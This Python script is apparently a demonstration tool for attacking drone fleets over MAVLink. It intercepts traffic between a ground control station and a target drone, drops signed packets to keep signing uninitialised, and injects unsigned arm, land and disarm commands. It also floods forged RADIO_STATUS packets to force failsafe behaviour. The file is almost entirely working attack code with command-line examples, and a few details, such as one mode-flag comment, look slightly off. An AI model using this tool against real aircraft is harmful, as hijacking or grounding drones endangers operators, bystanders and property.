#!/usr/bin/env python3
"""
MAVLink Signing Bypass via Channel Initialization Window
=========================================================
Threat Model:
  - Attacker controls one compromised drone (our drone)
  - Target drones have MAVLink signing enabled with UNKNOWN per-drone keys
  - Attacker positions itself as MITM between GCS and target drones
  
Attack Vector:
  MAVLink spec (mavlink.io/en/guide/message_signing.html):
  "A MAVLink library should by default accept unsigned packets or
   packets with incorrect signatures ONLY IF the link has not yet
   received any signed packets."
  
  Strategy:
  1. MITM: intercept GCS -> target_drone traffic (compromised drone as router)
  2. DROP all signed packets from GCS to the target (prevents channel init)
  3. TARGET stays in "unsigned acceptance" mode indefinitely
  4. INJECT unsigned commands to target (ARM, DISARM, SET_MODE, etc.)

  Additionally:
  - RADIO_STATUS (ID 109) is always accepted without signature (PX4 allowlist)
    Use it to inject degraded link quality -> trigger failsafe (RTL/LAND)
  - HEARTBEAT (ID 0) if injected before any signed heartbeat arrives,
    can be used to spoof system state

Usage:
  python3 mavlink_mitm_attack.py --gcs-ip 192.168.1.100 --gcs-port 14550 \
      --target-ip 127.0.0.1 --target-port 14560 \
      --our-system-id 2 --target-system-id 3 \
      --attack drop_and_inject

  For RADIO_STATUS failsafe attack:
  python3 mavlink_mitm_attack.py ... --attack radio_failsafe

Requirements:
  pip install pymavlink

"""

import socket
import threading
import time
import argparse
import struct
import logging
import sys
from typing import Optional

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("mitm")

# ─── MAVLink minimal parser ───────────────────────────────────────────────────

MAVLINK_V2_STX = 0xFD
MAVLINK_V1_STX = 0xFE

MSG_ID_HEARTBEAT    = 0
MSG_ID_SET_MODE     = 11
MSG_ID_COMMAND_LONG = 76
MSG_ID_RADIO_STATUS = 109   # Always accepted unsigned (PX4 allowlist)

MAV_CMD_COMPONENT_ARM_DISARM = 400
MAV_CMD_DO_SET_MODE          = 176

# MAV_MODE_FLAG
MAV_MODE_FLAG_SAFETY_ARMED   = 128
COPTER_MODE_LAND             = 9   # ArduPilot/PX4 mode ID for LAND

def parse_mavlink_frame(data: bytes):
    """
    Returns (header_dict, payload_bytes, full_frame_bytes) or None on failure.
    Handles both v1 and v2 (with/without signing).
    """
    if len(data) < 6:
        return None
    
    stx = data[0]
    
    if stx == MAVLINK_V2_STX:
        if len(data) < 10:
            return None
        plen   = data[1]
        incompat = data[2]
        compat   = data[3]
        seq    = data[4]
        sysid  = data[5]
        compid = data[6]
        msgid  = struct.unpack_from("<I", data[7:10] + b'\x00')[0]
        header_len = 10
        payload    = data[header_len: header_len + plen]
        crc        = data[header_len + plen: header_len + plen + 2]
        signed     = bool(incompat & 0x01)
        sig_bytes  = data[header_len + plen + 2: header_len + plen + 2 + 13] if signed else b''
        total_len  = header_len + plen + 2 + (13 if signed else 0)
        return {
            "version":  2,
            "stx":      stx,
            "plen":     plen,
            "incompat": incompat,
            "compat":   compat,
            "seq":      seq,
            "sysid":    sysid,
            "compid":   compid,
            "msgid":    msgid,
            "signed":   signed,
            "payload":  payload,
            "crc":      crc,
            "sig":      sig_bytes,
            "raw":      data[:total_len],
        }, total_len
    
    elif stx == MAVLINK_V1_STX:
        if len(data) < 6:
            return None
        plen   = data[1]
        seq    = data[2]
        sysid  = data[3]
        compid = data[4]
        msgid  = data[5]
        header_len = 6
        payload    = data[header_len: header_len + plen]
        crc        = data[header_len + plen: header_len + plen + 2]
        total_len  = header_len + plen + 2
        return {
            "version": 1,
            "stx":     stx,
            "plen":    plen,
            "seq":     seq,
            "sysid":   sysid,
            "compid":  compid,
            "msgid":   msgid,
            "signed":  False,
            "payload": payload,
            "crc":     crc,
            "sig":     b'',
            "raw":     data[:total_len],
        }, total_len
    
    return None, 0


# ─── MAVLink v2 packet builder (unsigned) ────────────────────────────────────

def mavlink_crc(data: bytes, extra_crc: int) -> int:
    """CRC-16/MCRF4XX with MAVLink extra CRC byte."""
    crc = 0xFFFF
    for b in data:
        tmp = b ^ (crc & 0xFF)
        tmp = (tmp ^ (tmp << 4)) & 0xFF
        crc = (crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)
    tmp = extra_crc ^ (crc & 0xFF)
    tmp = (tmp ^ (tmp << 4)) & 0xFF
    crc = (crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)
    return crc & 0xFFFF

# Extra CRC seeds (CRC_EXTRA) per message ID — from MAVLink common dialect
CRC_EXTRA = {
    MSG_ID_HEARTBEAT:    50,
    MSG_ID_SET_MODE:     89,
    MSG_ID_COMMAND_LONG: 152,
    MSG_ID_RADIO_STATUS: 185,
}

_seq_counter = 0
def _next_seq():
    global _seq_counter
    _seq_counter = (_seq_counter + 1) & 0xFF
    return _seq_counter


def build_v2_unsigned(msg_id: int, payload: bytes, sysid: int, compid: int) -> bytes:
    """Build a MAVLink v2 unsigned packet."""
    seq    = _next_seq()
    plen   = len(payload)
    incompat = 0x00   # No signing flag
    compat   = 0x00
    
    # msgid is 3 bytes little-endian
    mid_bytes = struct.pack("<I", msg_id)[:3]
    
    header = bytes([
        MAVLINK_V2_STX,
        plen,
        incompat,
        compat,
        seq,
        sysid,
        compid,
    ]) + mid_bytes
    
    crc_data = header[1:] + payload   # skip STX for CRC
    extra    = CRC_EXTRA.get(msg_id, 0)
    crc_val  = mavlink_crc(crc_data, extra)
    crc_bytes = struct.pack("<H", crc_val)
    
    return header + payload + crc_bytes


def build_command_long(
    sysid: int, compid: int,
    target_sysid: int, target_compid: int,
    command: int,
    p1=0.0, p2=0.0, p3=0.0, p4=0.0, p5=0.0, p6=0.0, p7=0.0
) -> bytes:
    """COMMAND_LONG (ID 76) — 33 bytes payload."""
    payload = struct.pack(
        "<fffffffHBBB",
        p1, p2, p3, p4, p5, p6, p7,
        command,
        0,             # confirmation
        target_sysid,
        target_compid,
    )
    return build_v2_unsigned(MSG_ID_COMMAND_LONG, payload, sysid, compid)


def build_radio_status(
    sysid: int, compid: int,
    rssi: int = 0, remrssi: int = 0, txbuf: int = 0,
    noise: int = 255, remnoise: int = 255,
    rxerrors: int = 9999, fixed: int = 9999
) -> bytes:
    """
    RADIO_STATUS (ID 109) — always accepted unsigned by PX4.
    Inject degraded values to trigger failsafe.
    """
    payload = struct.pack(
        "<HHBBBBBxx",
        rxerrors,
        fixed,
        rssi,
        remrssi,
        txbuf,
        noise,
        remnoise,
    )
    return build_v2_unsigned(MSG_ID_RADIO_STATUS, payload, sysid, compid)


def build_set_mode(
    sysid: int, compid: int,
    target_sysid: int,
    base_mode: int,
    custom_mode: int,
) -> bytes:
    """SET_MODE (ID 11) — 6 bytes payload."""
    payload = struct.pack("<IBB", custom_mode, target_sysid, base_mode)
    return build_v2_unsigned(MSG_ID_SET_MODE, payload, sysid, compid)


# ─── UDP socket helpers ───────────────────────────────────────────────────────

class UDPEndpoint:
    def __init__(self, listen_ip: str, listen_port: int, name: str = ""):
        self.name = name
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((listen_ip, listen_port))
        self.sock.settimeout(0.5)
        log.info(f"[{name}] Listening on {listen_ip}:{listen_port}")

    def recv(self):
        try:
            data, addr = self.sock.recvfrom(4096)
            return data, addr
        except socket.timeout:
            return None, None

    def send(self, data: bytes, addr):
        self.sock.sendto(data, addr)

    def close(self):
        self.sock.close()


# ─── Attack modes ────────────────────────────────────────────────────────────

class MITMAttack:
    """
    MITM between GCS and a target drone.
    
    Network assumption (WSL2 / MAVProxy / PX4 SITL setup):
      GCS (QGC on Windows) -> [our MITM listener] -> Target drone UDP port
    
    The compromised drone acts as a router/relay. All GCS traffic
    destined for the target fleet passes through us.
    """

    def __init__(self, args):
        self.args           = args
        self.gcs_ip         = args.gcs_ip
        self.gcs_port       = args.gcs_port
        self.target_ip      = args.target_ip
        self.target_port    = args.target_port
        self.listen_port    = args.listen_port
        self.our_sysid      = args.our_system_id
        self.target_sysid   = args.target_system_id
        self.attack_mode    = args.attack
        self.inject_count   = args.inject_count
        self.verbose        = args.verbose
        
        # State
        self.running        = True
        self.gcs_addr       = None        # learned from first GCS packet
        self.signed_dropped = 0
        self.injected       = 0
        self.target_socket  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.target_socket.settimeout(0.5)
        
        # Listener for GCS -> us
        self.listener = UDPEndpoint("0.0.0.0", self.listen_port, "MITM-listener")

    def _forward_to_target(self, data: bytes):
        self.target_socket.sendto(data, (self.target_ip, self.target_port))

    def _is_signed(self, frame_info) -> bool:
        if frame_info is None:
            return False
        return frame_info.get("signed", False)

    def _log_frame(self, label: str, fi):
        if not self.verbose or fi is None:
            return
        sign_str = "SIGNED" if fi.get("signed") else "unsigned"
        log.debug(f"  [{label}] sysid={fi['sysid']} msgid={fi['msgid']} {sign_str} len={len(fi['raw'])}")

    # ── Attack 1: Drop signed packets, then inject commands ──────────────────

    def _attack_drop_and_inject(self):
        """
        Phase 1: Relay all GCS traffic BUT drop any signed packet.
                 Target never receives a signed packet => stays in open mode.
        Phase 2: After N seconds, inject ARM + SET_MODE(LAND) unsigned.
        """
        log.info("=" * 60)
        log.info("ATTACK: Drop-signed + Inject")
        log.info("  Dropping all signed GCS->target packets.")
        log.info("  Target will stay in 'accept unsigned' channel state.")
        log.info(f"  Will inject commands in {self.args.inject_delay}s ...")
        log.info("=" * 60)

        inject_time = time.time() + self.args.inject_delay
        injected_this_run = False

        while self.running:
            data, addr = self.listener.recv()
            if data is None:
                # Injection window
                if not injected_this_run and time.time() >= inject_time:
                    self._inject_commands()
                    injected_this_run = True
                    if self.inject_count > 0 and self.injected >= self.inject_count:
                        log.info("Injection complete. Continuing relay...")
                continue

            # Learn GCS address
            if self.gcs_addr is None:
                self.gcs_addr = addr
                log.info(f"GCS address learned: {addr}")

            # Parse
            fi, consumed = parse_mavlink_frame(data)

            if fi is None:
                # Unknown data, forward anyway
                self._forward_to_target(data)
                continue

            self._log_frame("GCS->target", fi)

            if fi.get("signed"):
                self.signed_dropped += 1
                log.info(
                    f"[DROP] Signed packet sysid={fi['sysid']} "
                    f"msgid={fi['msgid']} "
                    f"(total dropped: {self.signed_dropped})"
                )
                # DO NOT forward — target never initializes the channel
            else:
                # Forward unsigned packets normally (HEARTBEAT, RADIO_STATUS, etc.)
                self._forward_to_target(data)
                if self.verbose:
                    log.debug(f"[FWD ] unsigned msgid={fi['msgid']}")

    def _inject_commands(self):
        """Send unsigned ARM + LAND commands to target."""
        target_compid = 1

        log.info(f"\n{'─'*50}")
        log.info("INJECTING unsigned commands to target drone")
        log.info(f"  Target sysid={self.target_sysid}, our sysid={self.our_sysid}")

        # 1. ARM
        arm_pkt = build_command_long(
            sysid=self.our_sysid, compid=self.our_sysid,
            target_sysid=self.target_sysid, target_compid=target_compid,
            command=MAV_CMD_COMPONENT_ARM_DISARM,
            p1=1.0,   # 1 = ARM, 0 = DISARM
        )
        for _ in range(3):   # Send multiple times for reliability
            self._forward_to_target(arm_pkt)
            time.sleep(0.05)
        self.injected += 1
        log.info(f"  [INJ] COMMAND_LONG(ARM) sent x3")

        time.sleep(0.5)

        # 2. SET_MODE -> LAND
        land_pkt = build_set_mode(
            sysid=self.our_sysid, compid=self.our_sysid,
            target_sysid=self.target_sysid,
            base_mode=MAV_MODE_FLAG_SAFETY_ARMED | 0x04,  # GUIDED | ARMED
            custom_mode=COPTER_MODE_LAND,
        )
        for _ in range(3):
            self._forward_to_target(land_pkt)
            time.sleep(0.05)
        self.injected += 1
        log.info(f"  [INJ] SET_MODE(LAND) sent x3")

        # 3. DISARM (after landing)
        time.sleep(2.0)
        disarm_pkt = build_command_long(
            sysid=self.our_sysid, compid=self.our_sysid,
            target_sysid=self.target_sysid, target_compid=target_compid,
            command=MAV_CMD_COMPONENT_ARM_DISARM,
            p1=0.0,
        )
        for _ in range(3):
            self._forward_to_target(disarm_pkt)
            time.sleep(0.05)
        self.injected += 1
        log.info(f"  [INJ] COMMAND_LONG(DISARM) sent x3")
        log.info(f"{'─'*50}\n")

    # ── Attack 2: RADIO_STATUS failsafe injection (no key needed, ever) ──────

    def _attack_radio_failsafe(self):
        """
        Inject RADIO_STATUS with worst possible values to degrade
        perceived link quality and trigger GCS/drone failsafe (RTL/LAND).
        
        RADIO_STATUS is in PX4's unsigned-always-accepted allowlist.
        This works even if the channel IS initialized (signed).
        """
        log.info("=" * 60)
        log.info("ATTACK: RADIO_STATUS Failsafe Injection")
        log.info("  Sending degraded RADIO_STATUS (always accepted unsigned)")
        log.info(f"  Target: {self.target_ip}:{self.target_port}")
        log.info("=" * 60)

        count = 0
        while self.running:
            pkt = build_radio_status(
                sysid=self.our_sysid,
                compid=self.our_sysid,
                rssi=0,        # 0 = no signal
                remrssi=0,
                txbuf=0,
                noise=255,     # maximum noise
                remnoise=255,
                rxerrors=9999,
                fixed=9999,
            )
            self._forward_to_target(pkt)
            count += 1
            if count % 10 == 0:
                log.info(f"  [INJ] RADIO_STATUS degraded x{count} sent to target")
            time.sleep(0.1)   # 10 Hz

    # ── Attack 3: Combined (drop signed + radio_status) ───────────────────────

    def _attack_combined(self):
        """Run drop_and_inject + radio_failsafe in parallel threads."""
        log.info("ATTACK: Combined (drop-signed + radio-failsafe)")
        t1 = threading.Thread(target=self._attack_drop_and_inject, daemon=True)
        t2 = threading.Thread(target=self._attack_radio_failsafe, daemon=True)
        t1.start()
        t2.start()
        t1.join()
        t2.join()

    # ── Entry point ───────────────────────────────────────────────────────────

    def run(self):
        try:
            if self.attack_mode == "drop_and_inject":
                self._attack_drop_and_inject()
            elif self.attack_mode == "radio_failsafe":
                self._attack_radio_failsafe()
            elif self.attack_mode == "combined":
                self._attack_combined()
            else:
                log.error(f"Unknown attack mode: {self.attack_mode}")
        except KeyboardInterrupt:
            log.info("\n[!] Interrupted by user.")
        finally:
            self.running = False
            self.listener.close()
            self.target_socket.close()
            log.info(f"Summary: signed_dropped={self.signed_dropped} injected={self.injected}")


# ─── CLI ─────────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(
        description="MAVLink Signing Bypass MITM — Threat C demo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples (WSL2 + PX4 SITL):

  # Attack drone sysid=3, listen on port 14565, inject after 15s
  python3 mavlink_mitm_attack.py \\
      --gcs-ip 172.x.x.x --gcs-port 14550 \\
      --target-ip 127.0.0.1 --target-port 14560 \\
      --listen-port 14565 \\
      --our-system-id 2 --target-system-id 3 \\
      --attack drop_and_inject --inject-delay 15

  # Radio failsafe only (works even with signing + per-drone keys)
  python3 mavlink_mitm_attack.py \\
      --target-ip 127.0.0.1 --target-port 14560 \\
      --our-system-id 2 --target-system-id 3 \\
      --attack radio_failsafe

  # Both attacks combined
  python3 mavlink_mitm_attack.py \\
      --gcs-ip 172.x.x.x --gcs-port 14550 \\
      --target-ip 127.0.0.1 --target-port 14560 \\
      --listen-port 14565 \\
      --our-system-id 2 --target-system-id 3 \\
      --attack combined --inject-delay 20
        """
    )
    p.add_argument("--gcs-ip",         default="0.0.0.0",   help="GCS IP address")
    p.add_argument("--gcs-port",       type=int, default=14550)
    p.add_argument("--target-ip",      default="127.0.0.1",  help="Target drone IP")
    p.add_argument("--target-port",    type=int, default=14560)
    p.add_argument("--listen-port",    type=int, default=14565,
                   help="Port to listen on (MITM intercept point)")
    p.add_argument("--our-system-id",  type=int, default=2,
                   help="MAVLink sysid of the compromised drone (attacker)")
    p.add_argument("--target-system-id", type=int, default=3,
                   help="MAVLink sysid of the target drone")
    p.add_argument("--attack", choices=["drop_and_inject", "radio_failsafe", "combined"],
                   default="drop_and_inject")
    p.add_argument("--inject-delay",  type=float, default=10.0,
                   help="Seconds to wait before injecting commands (drop_and_inject)")
    p.add_argument("--inject-count",  type=int, default=3,
                   help="Number of injection bursts (0=unlimited)")
    p.add_argument("--verbose", "-v", action="store_true")
    
    args = p.parse_args()
    
    log.info("MAVLink Signing Bypass MITM — Threat C")
    log.info(f"  Mode:         {args.attack}")
    log.info(f"  Our sysid:    {args.our_system_id}")
    log.info(f"  Target sysid: {args.target_system_id}")
    log.info(f"  Listen port:  {args.listen_port}")
    log.info(f"  Target:       {args.target_ip}:{args.target_port}")
    
    MITMAttack(args).run()


if __name__ == "__main__":
    main()